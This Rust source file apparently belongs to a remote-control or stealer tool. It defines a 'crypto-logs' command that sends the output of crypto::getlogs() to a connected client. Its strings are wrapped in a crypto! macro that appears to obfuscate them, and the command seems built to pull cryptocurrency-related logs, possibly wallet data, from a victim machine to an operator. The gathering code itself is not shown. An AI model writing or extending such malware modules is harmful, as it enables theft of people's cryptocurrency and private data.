use super::prelude::*;
use crate::utils;

pub struct Cryptolog;

#[async_trait]
impl Command for Cryptolog {
    fn name(&self) -> String {
        crypto!("crypto-logs")
    }

    fn help(&self) -> String {
        crypto!("sending crypto logs")
    }

    fn min_args(&self) -> usize {
        0
    }

    async fn execute(&self, client: &mut Client, _args: Vec<&str>) -> anyhow::Result<()> {
        client.send(crypto::getlogs())
    }
}
